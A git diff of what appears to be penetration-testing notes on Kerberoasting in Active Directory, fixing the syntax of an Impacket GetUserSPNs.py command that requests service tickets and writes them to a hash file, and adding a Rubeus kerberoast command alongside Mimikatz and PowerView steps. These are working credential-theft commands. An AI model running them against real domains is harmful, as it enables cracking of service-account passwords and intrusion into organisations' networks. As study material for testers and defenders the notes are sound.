@@ -21,7 +21,7 @@ Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrinici
 - Impacket's `GetUserSPNs.py` script can be used to query users with SPN and request STs for the service.
 ```bash
 # This will search for SPNs, request STs for the same using supplied credentials and same the STs in "kerberoast.hash"
-python GetUserSPNs.py 'mydomain.local@a.drdragon:Password!!' -dc-ip <ip> -outputfile kerberoast.hash
+python GetUserSPNs.py mydomain.local/a.drdragon:Password!! -dc-ip <ip> -outputfile kerberoast.hash
 ```
 - Requesting a TGS using powrshell
 ```powershell
@@ -35,4 +35,8 @@ kerberos::list /export
 - Powerview
 ```powershell
 Request-SPNTicket
+```
+- Rubeus
+```powershell
+.\Rubeus kerberoast /nowrap
 ```
